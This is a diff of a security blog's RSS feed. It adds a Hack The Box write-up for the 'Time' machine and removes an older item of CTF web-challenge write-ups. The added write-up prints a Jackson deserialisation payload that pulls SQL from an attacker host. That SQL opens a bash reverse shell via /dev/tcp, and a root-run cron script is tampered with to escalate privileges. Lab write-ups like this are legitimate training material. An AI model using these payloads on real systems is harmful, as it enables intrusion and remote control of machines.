@@ -1,4 +1,38 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Security, Development & Other Fun Stuff]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Wed, 24 Mar 2021 21:33:12 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[ØxOPOSɆC - Secrets [Crypto]]]></title><description><![CDATA[<blockquote>We all have secrets! And sometimes we need to share them with our online friends, safely... That's easy! - Just implement a very secure, hackerproof™ secret sharing web application!"<br>URL: <a href="https://secret.mbie.me/" rel="noopener noreferrer">https://secret.mbie.me</a></blockquote><p>When you access the website you see the following page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-11.png" class="kg-image"></figure><p>Entering random data on the input</p>]]></description><link>https://inesmartins.github.io//oposec-secrets/</link><guid isPermaLink="false">6040b267b4729d033918cd72</guid><category><![CDATA[cryptography]]></category><category><![CDATA[oposec]]></category><category><![CDATA[shamir]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 24 Mar 2021 21:31:29 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/03/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>We all have secrets! And sometimes we need to share them with our online friends, safely... That's easy! - Just implement a very secure, hackerproof™ secret sharing web application!"<br>URL: <a href="https://secret.mbie.me/" rel="noopener noreferrer">https://secret.mbie.me</a></blockquote><img src="https://inesmartins.github.io//content/images/2021/03/highres_471963990-1-1.jpeg" alt="ØxOPOSɆC - Secrets [Crypto]"><p>When you access the website you see the following page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-11.png" class="kg-image" alt="ØxOPOSɆC - Secrets [Crypto]"></figure><p>Entering random data on the input field doesn't seem to provide us with any interesting information:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-13.png" class="kg-image" alt="ØxOPOSɆC - Secrets [Crypto]"></figure><p>Using <a href="https://github.com/xmendez/wfuzz">wfuzz</a> I found a new page:</p><pre><code>~ wfuzz -c --hc 404 -w big.txt https://secret.mbie.me/FUZZ
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Security, Development & Other Fun Stuff]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Sun, 04 Apr 2021 20:56:41 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Time]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/286">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>It seems like this machine is running <code>OpenSSH</code> on port 22 and an <code>Apache</code> web server on port 80:</p><pre><code>~ nmap -sC -sV time.htb
+
+PORT   STATE SERVICE VERSION
+PORT     STATE    SERVICE        VERSION
+22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-time/</link><guid isPermaLink="false">5f95bf0d501631398681f989</guid><category><![CDATA[htb]]></category><category><![CDATA[jackson]]></category><category><![CDATA[deserialization]]></category><category><![CDATA[deserialisation]]></category><category><![CDATA[fasterxml]]></category><category><![CDATA[json]]></category><category><![CDATA[h2]]></category><category><![CDATA[sql]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 03 Apr 2021 13:50:00 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/04/banner.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/286">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="https://inesmartins.github.io//content/images/2021/04/banner.png" alt="HTB Write-up | Time"><p>It seems like this machine is running <code>OpenSSH</code> on port 22 and an <code>Apache</code> web server on port 80:</p><pre><code>~ nmap -sC -sV time.htb
+
+PORT   STATE SERVICE VERSION
+PORT     STATE    SERVICE        VERSION
+22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http           Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Online JSON parser</code></pre><p>When we access the website, we see a simple JSON "beautifier" and validator.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/10/image-2.png" class="kg-image" alt="HTB Write-up | Time"></figure><p>After submitting a couple of invalid JSON objects, it was clear from the error responses that the JSON was being parsed and validated using <a href="https://github.com/FasterXML/jackson-docshttps://github.com/FasterXML/jackson">Jackson</a>:</p><pre><code>Validation failed: Unhandled Java exception:
+com.fasterxml.jackson.databind.exc.MismatchedInputException: 
+Unexpected token (START_OBJECT), expected VALUE_STRING: 
+need JSON String that contains type id (for subtype of java.lang.Object)</code></pre><p>Turns out this parser has <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-34008/Fasterxml-Jackson.html">3 CVEs</a>, all to do with deserialisation vulnerabilities.</p><p><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">This</a> is a very good article that explains the root of these vulnerabilities and how to exploit them.</p><hr><h2 id="exploiting-jackson">Exploiting Jackson</h2><p>Since this version of Jackson already blocklists some insecure types, I had to rely on <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">this</a> BlackHat presentation from 2019 to find a valid exploit:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/11/image-1.png" class="kg-image" alt="HTB Write-up | Time"></figure><p>After going through <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">this</a> article, I realised that the easiest way to achieve an RCE using <code>DriverManagerConnectionSource</code> would be to abuse H2's <a href="http://www.h2database.com/html/features.html#execute_sql_on_connection">INIT=RUNSCRIPT FROM</a> feature. </p><p>Using this option, a database can be initialised with a SQL file that's hosted on the attacker's machine (I used <code>python -m SimpleHTTPServer 8000</code> to serve it).</p><pre><code class="language-JSON">[
+    "ch.qos.logback.core.db.DriverManagerConnectionSource", 
+    {
+    	"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://[attacker-ip]:8000/inject.sql'"
+     }
+]</code></pre><p>This SQL file also abuses an H2 feature - <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">Database ALIAS</a> - to create the reverse shell, as shown below:</p><pre><code class="language-SQL">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {"bash", "-c", cmd};
+    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+    return s.hasNext() ? s.next() : "";  }$$;
+CALL SHELLEXEC('bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[attacker-port] 0&gt;&amp;1')</code></pre><p>And we get a shell as <code>pericles</code>, which in this case also gives us the ability to read the user flag!</p><hr><h2 id="pericles-gets-root">pericles gets root</h2><p>While looking for files that belonged to group <code>pericles</code>, I saw something that caught my eye:</p><pre><code>pericles@time:~$ find / -group pericles
+
+...
+/usr/bin/timer_backup.sh
+...</code></pre><pre><code>pericles@time:~$ cat /usr/bin/timer_backup.sh
+#!/bin/bash
+zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip</code></pre><p>It looks like this script is periodically zipping the <code>/var/www/html</code> directory and then moving the zip file to the <code>root</code> directory.</p><p>This means that the script<em> can</em> access the <code>root</code> directory, which we can abuse by adding an extra line to it that writes the root flag to a directory accessible to our user, such as <code>tmp</code>:</p><pre><code>pericles@time:~$ echo 'cat /root/root.txt &gt; /tmp/out' &gt;&gt; /usr/bin/timer_backup.sh
+
+pericles@time:~$ cat  /usr/bin/timer_backup.sh
+#!/bin/bash
+zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip
+cat /root/root.txt &gt; /tmp/out</code></pre><p>Our <code>root</code> flag is now at <code>/tmp/out</code>.</p><p>And we're done 😊</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - Secrets [Crypto]]]></title><description><![CDATA[<blockquote>We all have secrets! And sometimes we need to share them with our online friends, safely... That's easy! - Just implement a very secure, hackerproof™ secret sharing web application!"<br>URL: <a href="https://secret.mbie.me/" rel="noopener noreferrer">https://secret.mbie.me</a></blockquote><p>When you access the website you see the following page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-11.png" class="kg-image"></figure><p>Entering random data on the input</p>]]></description><link>https://inesmartins.github.io//oposec-secrets/</link><guid isPermaLink="false">6040b267b4729d033918cd72</guid><category><![CDATA[cryptography]]></category><category><![CDATA[oposec]]></category><category><![CDATA[shamir]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 24 Mar 2021 21:31:29 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/03/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>We all have secrets! And sometimes we need to share them with our online friends, safely... That's easy! - Just implement a very secure, hackerproof™ secret sharing web application!"<br>URL: <a href="https://secret.mbie.me/" rel="noopener noreferrer">https://secret.mbie.me</a></blockquote><img src="https://inesmartins.github.io//content/images/2021/03/highres_471963990-1-1.jpeg" alt="ØxOPOSɆC - Secrets [Crypto]"><p>When you access the website you see the following page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-11.png" class="kg-image" alt="ØxOPOSɆC - Secrets [Crypto]"></figure><p>Entering random data on the input field doesn't seem to provide us with any interesting information:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-13.png" class="kg-image" alt="ØxOPOSɆC - Secrets [Crypto]"></figure><p>Using <a href="https://github.com/xmendez/wfuzz">wfuzz</a> I found a new page:</p><pre><code>~ wfuzz -c --hc 404 -w big.txt https://secret.mbie.me/FUZZ
 
 ...
 =====================================================================
@@ -1313,67 +1347,4 @@ for letter in alphabet:
         print("Found it! Flag is " + tmp_flag)
     
 os.system("echo '" + result_str + "' &gt; " + output_filename)
-os.system("open " + output_filename)</code></pre><p>And we get the flag: <code>flag{c4l1Po_de_l1M4o}</code>.</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up]]></title><description><![CDATA[<h2 id="passive-aggressive-flask-100-">Passive-Aggressive Flask (100)</h2><blockquote>I can give you a flag, but you'll have to be nice.<br>Remember to say it LOUD, so I can hear you.<br><a href="https://passiveaggressive.apl3b.com/">https://passiveaggressive.apl3b.com</a></blockquote><pre><code>~ curl https://passiveaggressive.apl3b.com
-
-&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-&lt;head&gt;
-  &lt;meta charset="utf-8"</code></pre>]]></description><link>https://inesmartins.github.io//oposec-summer-challenge-2020-web-challenges-write-up/</link><guid isPermaLink="false">5f19e6891e7da103a083f2a8</guid><category><![CDATA[web]]></category><category><![CDATA[flask]]></category><category><![CDATA[JS]]></category><category><![CDATA[javascript]]></category><category><![CDATA[regex]]></category><category><![CDATA[xml]]></category><category><![CDATA[xxe attack]]></category><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 24 Sep 2020 18:49:15 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/09/header2.png" medium="image"/><content:encoded><![CDATA[<h2 id="passive-aggressive-flask-100-">Passive-Aggressive Flask (100)</h2><blockquote>I can give you a flag, but you'll have to be nice.<br>Remember to say it LOUD, so I can hear you.<br><a href="https://passiveaggressive.apl3b.com/">https://passiveaggressive.apl3b.com</a></blockquote><pre><code>~ curl https://passiveaggressive.apl3b.com
-
-&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-&lt;head&gt;
-  &lt;meta charset="utf-8"&gt;
-  &lt;title&gt;Passive-Aggressive Flask&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body&gt;
-Not so fast.
-&lt;br&gt;
-You think you can just boss me around? 😠
-&lt;br&gt;
-Be &lt;i&gt;polite&lt;/i&gt;!
-&lt;/body&gt;
-&lt;/html&gt;%</code></pre><img src="https://inesmartins.github.io//content/images/2020/09/header2.png" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"><p>Looking at the clues I was pretty sure this challenge was going to be solved by sending some sort of specific keyword, such as "please" on all caps (because of the LOUD clue), but I wasn't sure how.</p><p>After some trial and error I finally got it:</p><pre><code>~ curl -X PLEASE https://passiveaggressive.apl3b.com
-
-...
-&lt;body&gt;
-Oh, finally someone who shows some respect. ☺️
-&lt;br&gt;
-Here, take this juicy flag: &lt;i&gt;flag{g4spach0_n0_t4ch0}&lt;/i&gt;!
-&lt;br&gt;
-(props to Pixels Camp 2020 Quiz Qualifiers &lt;3)
-&lt;/body&gt;
-&lt;/html&gt;%</code></pre><hr><h2 id="2020-200-">2020 (200)</h2><blockquote>Just represent the number 2020.<br>Easy, right? No digits allowed.<br><a href="https://2020.apl3b.com/">https://2020.apl3b.com</a></blockquote><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-6.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>Let's take a look at the source code to see what kind of validations are taking place:</p><pre><code class="language-javascript">...
-app.get('/', function (req, res, next) {
-  let output = '';
-  const code = req.query.code + '';
-  if (code &amp;&amp; code.length &lt; 300 &amp;&amp; !/[^a-z().]/.test(code)) {
-    try {
-      const result = vm.runInNewContext(code, {}, { timeout: 500 });
-      if (result === 2020) {
-        output = process.env.FLAG;
-      } else {
-        output = 'nope';
-      }
-    } catch (e) {
-      output = 'nope';
-    }
-  } else {
-    output = 'nope';
-  }
-  res.render('index', { title: '[a-z().]', output });
-});
-...</code></pre><p>So, basically we needed to find a piece of JS code that:</p><ul><li>was under 300 characters;</li><li>matched this REGEX: <code>!/[^a-z().]/</code>;</li><li>produced the number <code>2020</code>;</li><li>used functions and variables known to the <code>NodeJS</code> context.</li></ul><p>This last condition ended up being the hardest, and I had to rely pretty heavily on the <code>eval</code> function:</p><pre><code>eval.length.constructor(                  // Number()
-  eval.name.constructor.apply()           // String()
-    .concat(eval.name.big.apply.length)   // 2
-    .concat(eval.name.bold.length)        // 0
-    .concat(eval.name.big.apply.length)   // 2
-    .concat(eval.name.bold.length))       // 0</code></pre><p>Alternatively I found one that's a little longer:</p><pre><code>eval.length.constructor(
-  eval.name.constructor.apply()
-    .concat(((typeof(null))
-      .concat((typeof(null)))
-      .concat(typeof(eval)).length))
-    .concat(((typeof(null))
-      .concat((typeof(null)))
-      .concat(typeof(eval)).length)))</code></pre><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/09/image-36.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><hr><h2 id="extensible-risky-language-300-">Extensible Risky Language (300)</h2><blockquote>Your flag is securely stored in <code>/etc/passwd</code> .<br><a href="https://risky.apl3b.com/">https://risky.apl3b.com</a></blockquote><p>I smell an <code>XXE</code> attack!</p><p>When we submit our shoe size, the size is reflected below the input field, so I immediately thought the idea was to manipulate the <code>XML</code> sent to the server in order to fetch the <code>/etc/passwd</code> file.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-13.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>If this wasn't enough of a clue, it looks like the devs are not great at XML.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-11.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>And indeed when we send a <code>POST</code> request to <a href="https://risky.apl3b.com/process">https://risky.apl3b.com/process</a> with our shoe size, the form data is sent in XML:</p><pre><code>xml: &lt;stock&gt;&lt;size&gt;34&lt;/size&gt;&lt;/stock&gt;</code></pre><p>Let's exploit <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">this vulnerability</a> to get the content of the <code>/etc/passwd</code> file:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-15.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>And we get our flag: <code>flag{g3lat1na_r0y4l_m0raNg0}</code>.</p>]]></content:encoded></item></channel></rss>
+os.system("open " + output_filename)</code></pre><p>And we get the flag: <code>flag{c4l1Po_de_l1M4o}</code>.</p>]]></content:encoded></item></channel></rss>
